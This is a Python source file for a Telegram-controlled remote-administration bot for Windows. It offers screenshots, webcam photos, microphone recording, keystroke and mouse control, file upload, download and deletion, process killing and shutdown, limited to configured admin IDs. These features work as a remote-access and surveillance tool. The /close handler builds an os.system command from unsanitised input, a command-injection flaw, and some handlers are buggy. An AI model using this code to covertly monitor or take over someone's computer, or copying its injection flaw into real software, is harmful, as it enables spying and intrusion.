import os
import telebot
import tempfile
import time
import config
import subprocess
import sys
import pyautogui
import keyboard
import datetime

from PIL import ImageGrab
from subprocess import Popen
from subprocess import Popen, PIPE

import pyautogui
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO

import cv2
import numpy as np

import threading

import sounddevice as sd
from scipy.io.wavfile import write

current_directory = os.path.dirname(os.path.abspath(__file__))

settings_file_path = os.path.join(current_directory, 'settings.txt')

with open(settings_file_path, 'r') as file:
    lines = file.readlines()

for line in lines:
    if line.startswith('TOKEN'):
        _, token_value = line.split('=')
        TOKEN = token_value.strip().strip('"')
    elif line.startswith('ADMIN_ID'):
        _, admin_id_value = line.split('=')
        ADMIN_ID = admin_id_value.strip().strip('[]').split(',')

ADMIN_ID = [int(id) for id in ADMIN_ID]

log_filename = 'bot_logs.txt'

def log_to_file_and_console(message):
    with open(log_filename, 'a') as log_file:
        log_file.write(message + '\n')

    print(message)

bot = telebot.TeleBot(TOKEN)

adm = ADMIN_ID

for admin_id in adm:
    bot.send_message(chat_id=admin_id, text='бот запущен')

message_text = f"бот запущен"
log_to_file_and_console(message_text)

@bot.message_handler(commands=['start'])
def welcome(message):
    message_text = "-------------\n"
    message_text += f"chat.id: {message.chat.id}\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"username: {message.from_user.username}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'ты кто?')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        bot.send_message(message.chat.id, "привет " + message.from_user.first_name)

    log_to_file_and_console(message_text)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_thread = threading.Thread(target=send_help_message, args=(message,))
    help_thread.start()
def send_help_message(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'ты кто?')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        help_message = "список доступных команд:\n\n"\
                       "/move x y - переместить мышь на указанные координаты (x, y)\n\n"\
                       "/mouse - альтернатива move x y, реализуется через указания вправо|влево|вверх|вниз X (x - количество пикселей)\n\n"\
                       "/click - нажать левую кнопку мыши\n\n"\
                       "/rightclick - нажать правую кнопку мыши\n\n"\
                       "/scroll число - прокрутить колесико мыши на указанное количество шагов (amount)\n\n"\
                       "/doubleclick - двойное нажатие\n\n"\
                       "/text текст который нужно ввести - для ввода в выбранную строку\n\n"\
                       "/programs - запущенные программы\n\n"\
                       "/screenshot - скриншот экрана\n\n"\
                       "/play x - запись с микро на x сек\n\n"\
                       "/switchoff - выключить пк\n\n"\
                       "/setvolume x - от 0% до 100%\n\n"\
                       "/ls - просмотреть файлы в текущей директории\n\n"\
                       "/cd <директория> - перейти в директорию\n\n"\
                       "/cd .. - вернуться в родительскую директорию\n\n"\
                       "/download <имя файла> - скачивание файла\n\n"\
                       "/upload - загрузка файла в текущую директорию\n\n"\
                       "/delete <имя файла> - удаление файла\n\n"\
                       "/photo - фото с камеры\n\n"\
                       "/presskeys - нажатие определнной клавиши или сочетание клавиш через +\n(чтобы получить список клавиш /presskeys help)\n\n"\
                       "/open - нужно указать полный путь для открытия программы/файла или ссылку на страницу в браузере\n\n"\
                       "/close - нужно указать имя программы для ее закрытия"
        bot.reply_to(message, help_message)
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['switchoff'])
def switchoff(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:

        bot.send_message(message.chat.id, 'выключаю...')
        os.system("shutdown /p")
        bot.send_message(message.chat.id, 'выключил')
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['play'])
def play_command(message):
    play_thread = threading.Thread(target=start_recording, args=(message,))
    play_thread.start()
def start_recording(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    chat_id = message.chat.id
    log_to_file_and_console(message_text)
    if chat_id not in adm:
        bot.send_message(chat_id, 'не дозволено')
        message_text = f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
        log_to_file_and_console(message_text)
        return
    try:
        _, amount = message.text.split()
        amount = int(amount)
        amount1 = str(amount)

        bot.send_message(chat_id, 'записываю\nожидай '+ amount1 + ' сек')

        fs = 44100
        seconds = amount
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('output.wav', fs, myrecording)
        output = open('output.wav', 'rb')
        bot.send_audio(chat_id, output)
        output.close()
        os.remove('output.wav')
    except ValueError:
        bot.reply_to(message, "неправильный формат. Используйте команду в формате /play X, где X время в секундах")

@bot.message_handler(commands=['presskeys'])
def send_presskeys_command(message):
    presskeys_thread = threading.Thread(target=handle_press_keys, args=(message,))
    presskeys_thread.start()
def handle_press_keys(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm and message.chat.id not in adm1:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        try:
            if message.text == '/presskeys help':
                available_keys = "Presskeys help:\n\n"

                available_keys += "A (Ф), B (И), C (С), D (В), E (У)\n" \
                "F (А), G (П), H (Р), I (Ш), J (О), K (Л), L (Д), M (Ь)\n" \
                "N (Т), O (Щ), P (З), Q (Й), R (К), S (Ы), T (Е), U (Г), V (М)\n" \
                "W (Ц), X (Ч), Y (Н), Z (Я)\n\n"
                available_keys += "1, 2, 3, 4, 5, 6, 7, 8, 9, 0\n\n"
                available_keys += "esc, tab, capslock, space\n" \
                "enter, backspace, delete, shift, ctrl, alt, fn, win\n" \
                "insert, home, end, pageup, pagedown, printscreen, scrolllock, pause/break, numlock\n" \
                "Arrow keys (стрелки): up, down, left, right, menu\n" \
                "F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12\n"
                bot.send_message(message.chat.id, available_keys)
            else:
                keys = message.text.split(' ', 1)[1]
                keys = keys.split('+')
                for key in keys:
                    pyautogui.keyDown(key)
                time.sleep(0.5)
                for key in keys:
                    pyautogui.keyUp(key)
                bot.send_message(message.chat.id, f"Клавиши {'+'.join(keys)} были нажаты и отпущены.")
        except IndexError:
            bot.send_message(message.chat.id, "Нужно прописать сочетание клавиш через + или же только одну клавишу")
    log_to_file_and_console(message_text)


@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        screenshot_thread = threading.Thread(target=screenshot, args=(message,))
        screenshot_thread.start()
    log_to_file_and_console(message_text)
def screenshot(message):
    screenshot = pyautogui.screenshot()
    mouse_x, mouse_y = pyautogui.position()
    image = Image.frombytes("RGB", screenshot.size, screenshot.tobytes())
    draw = ImageDraw.Draw(image)
    radius = 10
    draw.ellipse((mouse_x - radius, mouse_y - radius, mouse_x + radius, mouse_y + radius), outline="red", width=2)
    font = ImageFont.truetype("font.ttf", 40)
    text = f"Cursor Position: ({mouse_x}, {mouse_y})"
    text_width, text_height = draw.textsize(text, font)
    draw.text((mouse_x - text_width // 2, mouse_y + radius + 5), text, font=font, fill="red")
    image_path = "screenshot.png"
    image.save(image_path)
    with open(image_path, "rb") as file:
        bot.send_photo(message.chat.id, file)
    os.remove(image_path)

@bot.message_handler(commands=['photo'])
def send_photo_command(message):
    photo_thread = threading.Thread(target=capture_photo, args=(message,))
    photo_thread.start()
def capture_photo(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if ret:
            cv2.imwrite('webcam_photo.jpg', frame)
            with open('webcam_photo.jpg', 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove('webcam_photo.jpg')
        else:
            bot.reply_to(message, "Не удалось получить фотографию с вебкамеры.")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['programs'])
def programs_command(message):
    programs_thread = threading.Thread(target=get_running_programs, args=(message,))
    programs_thread.start()

def get_running_programs(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    log_to_file_and_console(message_text)
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text = f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
        log_to_file_and_console(message_text)
    else:
        with open('disp.txt', 'w') as a:
            sys.stdout = a
            print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
        sys.stdout = sys.__stdout__
        a.close()

        if os.path.exists('disp.txt'):
            doc = open('disp.txt', 'rb')
            bot.send_document(message.chat.id, doc)
            doc.close()
            os.remove('disp.txt')
        else:
            bot.send_message(message.chat.id, 'Не удалось получить список запущенных программ.')

@bot.message_handler(commands=['move'])
def move_mouse(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        try:
            _, x, y = message.text.split()
            x, y = int(x), int(y)
            pyautogui.moveTo(x, y)
            bot.reply_to(message, f"мышь перемещена на ({x}, {y})")
        except ValueError:
            bot.reply_to(message, "неправильный формат координат. Используйте команду в формате /move x y")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['mouse'])
def move_cursor(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        try:
            command = message.text.lower()
            if "вправо" in command:
                distance = int(command.split("вправо")[1].strip())
                pyautogui.move(distance, 0)
                bot.reply_to(message, f"Мышь перемещена вправо {distance}.")
            elif "влево" in command:
                distance = int(command.split("влево")[1].strip())
                pyautogui.move(-distance, 0)
                bot.reply_to(message, f"Мышь перемещена влево {distance}.")
            elif "вверх" in command:
                distance = int(command.split("вверх")[1].strip())
                pyautogui.move(0, -distance)
                bot.reply_to(message, f"Мышь перемещена вверх {distance}.")
            elif "вниз" in command:
                distance = int(command.split("вниз")[1].strip())
                pyautogui.move(0, distance)
                bot.reply_to(message, f"Мышь перемещена вниз {distance}.")
            else:
                bot.reply_to(message, "Не удалось распознать команду.")
        except ValueError:
            bot.reply_to(message, "Неправильный формат команды. Используйте команду вида '/mouse вправо X'.")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['click'])
def click_mouse(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        pyautogui.click()
        bot.reply_to(message, "нажата левая кнопка мыши")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['doubleclick'])
def click_mouse(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        pyautogui.doubleClick()
        bot.reply_to(message, "нажата левая кнопка мыши")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['rightclick'])
def right_click_mouse(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        pyautogui.rightClick()
        bot.reply_to(message, "нажата правая кнопка мыши")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['text'])
def text(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        try:
            _, text1 = message.text.split()
            amount = str(text1)
            keyboard.write(text1)
            bot.reply_to(message, f"был введен текст: {text1}")
        except ValueError:
            bot.reply_to(message, "неправильный формат. Используйте команду в формате /text текст")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['scroll'])
def scroll_mouse(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        try:
            _, amount = message.text.split()
            amount = int(amount)
            pyautogui.scroll(amount)
            bot.reply_to(message, f"колесико мыши прокручено на {amount} шагов")
        except ValueError:
            bot.reply_to(message, "неправильный формат количества шагов. Используйте команду в формате /scroll amount")
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['setvolume'])
def setvolume(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, 'не указано значение громкости')
            return

        volume = int(message.text.split()[1])
        if volume <= 100 and volume >= 0:
            value = int(volume * 655.35)
            os.system(f'nircmd.exe setsysvolume {value}')
            bot.send_message(message.chat.id, f'громкость установлена на {volume}%')
        elif volume > 100:
            bot.send_message(message.chat.id, 'громкость не установлена')
        elif volume < 0:
            bot.send_message(message.chat.id, 'громкость не установлена')
    log_to_file_and_console(message_text)

current_directory = os.getcwd()

@bot.message_handler(commands=['ls'])
def list_files(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        files = os.listdir(current_directory)
        file_list = "\n".join(files)
        bot.reply_to(message, f'Файлы в текущей директории:\n{file_list}')
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['cd'])
def change_directory(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        global current_directory
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Используйте команду /cd <директория>")
            return

        new_directory = args[1]
        if new_directory == '..':
            current_directory = os.path.dirname(current_directory)
        else:
            new_path = os.path.join(current_directory, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                current_directory = new_path
            else:
                bot.reply_to(message, f'Директория {new_directory} не существует.')

        bot.reply_to(message, f'Текущая директория: {current_directory}')
    log_to_file_and_console(message_text)

@bot.message_handler(commands=['download'])
def download_file_command(message):
    download_thread = threading.Thread(target=download_file, args=(message,))
    download_thread.start()
def download_file(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    log_to_file_and_console(message_text)
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text = f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
        log_to_file_and_console(message_text)
    else:
        global current_directory
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Используйте команду /download <имя файла>")
            return

        file_name = args[1]
        file_path = os.path.join(current_directory, file_name)

        if os.path.exists(file_path) and os.path.isfile(file_path):
            try:
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
            except Exception as e:
                bot.reply_to(message, f'Ошибка при отправке файла: {str(e)}')
        else:
            bot.reply_to(message, f'Файл {file_name} не найден.')

waiting_for_upload = {}

@bot.message_handler(commands=['upload'])
def upload_file(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        chat_id = message.chat.id
        waiting_for_upload[chat_id] = True
        bot.reply_to(message, "Теперь вы можете загрузить файл. Отправьте файл, который хотите загрузить.")
    log_to_file_and_console(message_text)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    handle_thread = threading.Thread(target=handle_document_thread, args=(message,))
    handle_thread.start()
def handle_document_thread(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    chat_id = message.chat.id
    log_to_file_and_console(message_text)
    if chat_id not in adm:
        bot.send_message(chat_id, 'не дозволено')
        message_text = f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
        log_to_file_and_console(message_text)
        return

    global current_directory
    if chat_id in waiting_for_upload and waiting_for_upload[chat_id]:
        file_info = message.document
        file_id = file_info.file_id
        file_name = file_info.file_name
        file_path = os.path.join(current_directory, file_name)

        if not os.path.exists(file_path):
            try:
                file_info = bot.get_file(file_id)
                file = bot.download_file(file_info.file_path)
                with open(file_path, 'wb') as new_file:
                    new_file.write(file)

                bot.reply_to(message, f'Файл {file_name} загружен.')
            except Exception as e:
                bot.reply_to(message, f'Ошибка при загрузке файла: {str(e)}')
        else:
            bot.reply_to(message, f'Файл {file_name} уже существует в текущей директории.')

        waiting_for_upload[chat_id] = False
    else:
        bot.reply_to(message, "Пожалуйста, используйте команду /upload для загрузки файла.")

@bot.message_handler(commands=['delete'])
def delete_file_command(message):
    delete_thread = threading.Thread(target=delete_file, args=(message,))
    delete_thread.start()
def delete_file(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    chat_id = message.chat.id
    log_to_file_and_console(message_text)
    if chat_id not in adm:
        bot.send_message(chat_id, 'не дозволено')
        message_text = f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
        log_to_file_and_console(message_text)
        return

    global current_directory
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Используйте команду /delete <имя файла>")
        return

    file_name = args[1]
    file_path = os.path.join(current_directory, file_name)

    if os.path.exists(file_path) and os.path.isfile(file_path):
        try:
            os.remove(file_path)
            bot.reply_to(message, f'Файл {file_name} удален.')
        except Exception as e:
            bot.reply_to(message, f'Ошибка при удалении файла: {str(e)}')
    else:
        bot.reply_to(message, f'Файл {file_name} не найден.')

def open_file(message, file_name):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        if not file_name:
            message_text += 'Не указано имя файла или ссылки для открытия.'
        elif os.path.exists(file_name):
            try:
                os.startfile(file_name)
            except Exception as e:
                message_text += f'Ошибка при выполнении файла: {str(e)}'
                bot.reply_to(message, f'Ошибка при выполнении файла: {str(e)}')
        else:
            if file_name.startswith(("http://", "https://")):
                try:
                    subprocess.Popen(["start", "", file_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     shell=True)
                except Exception as e:
                    message_text += f'Ошибка при открытии ссылки: {str(e)}'
            else:
                message_text += 'Указанный файл не существует и не является ссылкой.'

    log_to_file_and_console(message_text)

@bot.message_handler(commands=['open'])
def execute_open_file_command(message):
    if len(message.text.split()) > 1:
        file_name = message.text.split()[1]
    else:
        file_name = None
        bot.reply_to(message, 'Укажите имя и путь или ссылку для открытия.')

    execute_thread = threading.Thread(target=open_file, args=(message, file_name))
    execute_thread.start()

def close_file(message, process_name):
    try:
        os.system(f'TASKKILL /F /IM {process_name}')
    except Exception as e:
        bot.reply_to(message, f'Ошибка при закрытии файла: {str(e)}')

@bot.message_handler(commands=['close'])
def execute_close_file_command(message):
    message_text = "-------------\n"
    message_text += f"from_user: {message.from_user.first_name} {message.from_user.last_name}\n"
    message_text += f"text: {message.text}\n"
    message_text += f"timestamp: {datetime.datetime.now()}\n"
    message_text += "-------------\n"
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'ты кто?')
        message_text += f"нет доступа у: {message.from_user.first_name} {message.from_user.last_name}\n"
    else:
        if len(message.text.split()) > 1:
            process_name = message.text.split()[1]
            execute_thread = threading.Thread(target=close_file, args=(message, process_name))
            execute_thread.start()
        else:
            bot.reply_to(message, 'Укажите имя процесса для закрытия.')
    log_to_file_and_console(message_text)

def bot_polling():
    bot.polling()

bot_thread = threading.Thread(target=bot_polling)
bot_thread.start()